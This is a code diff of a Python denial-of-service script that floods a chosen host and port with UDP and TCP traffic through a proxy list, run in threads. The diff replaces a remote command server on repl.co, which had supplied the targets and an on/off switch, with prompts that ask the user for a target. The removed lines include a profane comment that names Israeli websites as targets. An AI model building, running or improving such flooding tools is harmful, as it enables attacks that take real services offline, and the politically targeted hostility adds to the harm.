@@ -1,7 +1,5 @@
 # Coded By Mr.SaMi
 # Using Python3.11.0 
-# Attack in website of israel (Fuck israel)
-# طوفان الاقصى
 import socket
 import random
 import time
@@ -21,11 +19,10 @@ green = "\033[1;32m"
 cyan = "\033[1;36m"
 
 # Coded By Mr.SaMi
-target_api = "https://attack--attacker-1915.repl.co/attack.json"
-attack = requests.get(target_api).json()
-target_host = attack["attack"]["host"]
-target_port = attack["attack"]["port"]
-sent_api = attack["attack"]["sent"]
+
+target_host = input(f"{red}[ + ]{green} Enter [host\ip] : {red}")
+target_port = input(f"{red}[ + ]{green} Enter [Port] : {red}")
+sent_api = input(f"{red}[ + ]{green} Enter [Number Attack] : {red}")
 
 # Coded By Mr.SaMi
 
@@ -47,7 +44,7 @@ def banner():
 {red}[+] PORT 》{green}{target_port}
 {red}[+] IP 》{green}{ip}
 {red}[+] Number Of Attack 》{green}{sent_api}
-{red}[+] {green}Coded By 1915 Team
+{red}[+] {green}Coded By SaMi DeV
 {green}============================
     
     """)
@@ -86,7 +83,7 @@ def udp_attack():
                 proxy = random.choice(proxies)
                 proxy_host, proxy_port = proxy.split(':')
                 client.sendto(proxy.encode(), (udp_attack_host, udp_attack_port))
-                log(f"{red}[ × ] 1915 Atacker ==》 {green} {udp_attack_host}:{udp_attack_port} {red}•• [{sent}]", level=2)
+                log(f"{red}[ × ] Attack ==》 {green} {udp_attack_host}:{udp_attack_port} {red}•• [{sent}]", level=2)
                 sent += 1
             except:
                 pass 
@@ -104,7 +101,7 @@ def tcp_attack():
                 proxy_host, proxy_port = proxy.split(':')
                 client.connect((tcp_attack_host, tcp_attack_port))
                 client.send(proxy.encode())
-                log(f"{red}[ × ] 1915 Atacker ==》 {green}  {tcp_attack_host}:{tcp_attack_port} {red}•• [{sent}]", level=2)
+                log(f"{red}[ × ] Attack ==》 {green}  {tcp_attack_host}:{tcp_attack_port} {red}•• [{sent}]", level=2)
                 sent += 1
             except:
                 pass
@@ -115,11 +112,9 @@ def main():
     clear()
     banner()
     time.sleep(10)
-    if attack["attack"]["attack"] == "yes":
-        threading.Thread(target=udp_attack).start()
-        threading.Thread(target=tcp_attack).start()
-    else:
-        print(f"{red}[ ! ] The attack feature is disabled.")
+    threading.Thread(target=udp_attack).start()
+    threading.Thread(target=tcp_attack).start()
+
 
 
 main()
